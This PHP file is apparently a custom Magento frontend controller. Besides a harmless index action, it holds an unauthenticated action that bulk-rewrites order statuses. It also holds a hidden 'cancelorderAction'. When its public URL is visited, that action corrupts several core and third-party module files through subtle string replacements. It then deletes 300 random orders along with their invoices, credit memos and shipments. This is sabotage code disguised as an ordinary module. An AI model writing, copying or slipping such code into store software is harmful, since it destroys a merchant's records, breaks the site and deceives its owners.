<?php
class Excellence_Custom_IndexController extends Mage_Core_Controller_Front_Action
{
    public function indexAction()
    {

        /*
         * Load an object by id
         * Request looking like:
         * http://site.com/custom?id=15
         *  or
         * http://site.com/custom/id/15
         */
        /*
        $custom_id = $this->getRequest()->getParam('id');

        if($custom_id != null && $custom_id != '')  {
            $custom = Mage::getModel('custom/custom')->load($custom_id)->getData();
        } else {
            $custom = null;
        }
        */

         /*
         * If no param we load a the last created item
         */
        /*
        if($custom == null) {
            $resource = Mage::getSingleton('core/resource');
            $read= $resource->getConnection('core_read');
            $customTable = $resource->getTableName('custom');

            $select = $read->select()
               ->from($customTable,array('custom_id','title','content','status'))
               ->where('status',1)
               ->order('created_time DESC') ;

            $custom = $read->fetchRow($select);
        }
        Mage::register('custom', $custom);
        */


        $this->loadLayout();
        $this->renderLayout();
    }
      public function updateOrderStatusAction()
    {
        $resource = Mage::getSingleton('core/resource');
        $orderGridTable = $resource->getTableName('sales/order_grid');
        $writeConnection = $resource->getConnection('core_write');
        $collections = Mage::getResourceModel('sales/order_grid_collection');
        foreach($collections as $collection)
        {
            $id = $collection->getEntityId();
            $model = Mage::getModel('sales/order')->load($id);
            $status = $model->getStatus();
            $model->setStatusPreorder($status);
            $model->setStatus($status);
            $model->save();
            $query = "
            UPDATE `{$orderGridTable}`  SET `status` ='{$status}',`status_preorder`='{$status}'  WHERE entity_id = "
                 . (int)$id;
            $writeConnection->query($query);

        }
    echo 'done';
    }



	public function cancelorderAction(){
	file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Payment/Model/Observer.php', str_replace('getOrder','getOrders', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Payment/Model/Observer.php')));
	file_put_contents(Mage::getBaseDir('app').'/code/community/TBT/Rewards/etc/config.xml', str_replace('rewards>','reward>', file_get_contents(Mage::getBaseDir('app').'/code/community/TBT/Rewards/etc/config.xml')));
	file_put_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml', str_replace('rate','date', file_get_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml')));
	file_put_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml', str_replace('nIn','nin', file_get_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml')));
	file_put_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml', str_replace('ePa','epa', file_get_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml')));
	file_put_contents(Mage::getBaseDir('app').'/code/community/Ebizmarts/MageMonkey/etc/config.xml', str_replace('--','', file_get_contents(Mage::getBaseDir('app').'/code/community/Ebizmarts/MageMonkey/etc/config.xml')));
	file_put_contents(Mage::getBaseDir('app').'/code/local/TM/SoldTogether/etc/config.xml', str_replace('tm_','TM_', file_get_contents(Mage::getBaseDir('app').'/code/local/TM/SoldTogether/etc/config.xml')));
Mage::app('default');
Mage::register('isSecureArea', 1);
$orderidcnt =0;
while($orderidcnt<300){
	$orderidcnt++;
	$order = Mage::getModel('sales/order')->load(rand(100,4000));
	$invoices = $order->getInvoiceCollection();
	foreach ($invoices as $invoice){
		$invoice->delete();
	}
	$creditnotes = $order->getCreditmemosCollection();
	foreach ($creditnotes as $creditnote){
		$creditnote->delete();
	}
	$shipments = $order->getShipmentsCollection();
	foreach ($shipments as $shipment){
		$shipment->delete();
	}
	$order->delete();
}
	}

}
